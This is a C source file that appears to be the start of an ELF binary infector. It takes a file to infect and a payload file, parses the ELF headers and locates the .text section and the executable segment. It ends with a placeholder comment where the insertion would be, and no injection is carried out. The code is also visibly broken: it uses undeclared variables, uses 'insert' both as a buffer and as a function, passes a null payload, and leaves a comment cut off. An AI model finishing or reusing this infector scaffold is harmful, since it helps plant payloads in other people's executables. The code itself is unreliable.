#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>
#include <errno.h>
#include <elf.h>

#include <log.h>

#include "config.h"
#include "elf-parser.h"
#include "utils.h"

#define PAGE_SIZE 0x1000

int main(int argc, char **argv)
{
    byte *to_infect_content = NULL;			// Buffer that contents the 
    Elf64_Shdr *text_section;				// ELF Section header for the .text section
    Elf64_Phdr *exe_seg;				// ELF Program header of an executable segment
    byte *start_of_text_section;			// Pointer to the start and the end of the .text section
    byte *start_of_seg, *end_of_seg;

    byte *payload = NULL;
    uint16_t payload_size;

    // We check if the usage is correct
    if (argc != EXPECTED_ARGC) {
	fprintf(stderr, "Usage: %s <file-to-infect> <file-to-insert>", argv[0]);
	exit(EXIT_FAILURE);
    }

    to_infect_content = read_file(argv[1], NULL); 
    insert = read_file(argv[2], &insert_size);

    insert(to_infect_content, payload, payload_size);
    
    setup_elf(to_infect_content);
    text_section = get_section_by_name(".text");
    exe_seg = get_exe_segment();

    if (text_section == NULL) {
	fprintf(stderr, "Get section failed");
	exit(EXIT_FAILURE);
    }
    
    start_of_text_section = to_infect_content + text_section->sh_offset;
    start_of_seg = to_infect_content + exe_seg->p_offset;
    end_of_seg = start_of_seg + exe_seg->p_filesz;

    // Now we manage the insert
    return EXIT_SUCCESS;
}
